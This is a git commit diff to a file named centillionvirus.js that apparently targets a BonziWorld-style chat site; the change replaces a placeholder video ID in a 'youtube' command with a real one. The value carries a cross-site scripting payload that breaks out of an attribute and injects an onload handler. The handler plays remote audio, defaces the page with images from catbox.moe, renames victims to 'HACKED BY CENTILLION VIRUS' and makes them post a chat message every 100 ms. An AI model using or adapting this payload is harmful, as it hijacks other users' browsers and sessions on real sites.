56638068c1619937d0428e027826bce22930c461
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-07-10 21:36:32 -0300

    Update centillionvirus.js

--- gokidded/centillionvirus.js
+++ gokidded/centillionvirus.js
@@ -1,6 +1,6 @@
 socket.emit('command', {
   list: [
     "youtube",
-    "VIDEO_ID\" onload=\"audio = new Audio('https://files.catbox.moe/l7r1uz.wav'), audio.play(), setInterval(function(){document.title = '27: WAAAAAAAAAAAAAAAAA!', document.getElementById('content').style.backgroundImage = 'url(https://files.catbox.moe/zdo3h2.gif)', socket.emit('command',{list:['name','HACKED BY CENTILLION VIRUS']}), document.getElementById('chat_send').style.backgroundImage = 'url(https://files.catbox.moe/mny94x.jpg)', document.getElementById('chat_bar').style.backgroundImage = 'url(https://files.catbox.moe/mny94x.jpg)', socket.emit('talk',{text:'27 YOU GROUNDED FOR HACKING BONZIWORLD! GO TO ROOM NOW! '})}, 100)\""
+    "PFPnkmGH9pU\" onload=\"audio = new Audio('https://files.catbox.moe/l7r1uz.wav'), audio.play(), setInterval(function(){document.title = '27: WAAAAAAAAAAAAAAAAA!', document.getElementById('content').style.backgroundImage = 'url(https://files.catbox.moe/zdo3h2.gif)', socket.emit('command',{list:['name','HACKED BY CENTILLION VIRUS']}), document.getElementById('chat_send').style.backgroundImage = 'url(https://files.catbox.moe/mny94x.jpg)', document.getElementById('chat_bar').style.backgroundImage = 'url(https://files.catbox.moe/mny94x.jpg)', socket.emit('talk',{text:'27 YOU GROUNDED FOR HACKING BONZIWORLD! GO TO ROOM NOW! '})}, 100)\""
   ]
 });
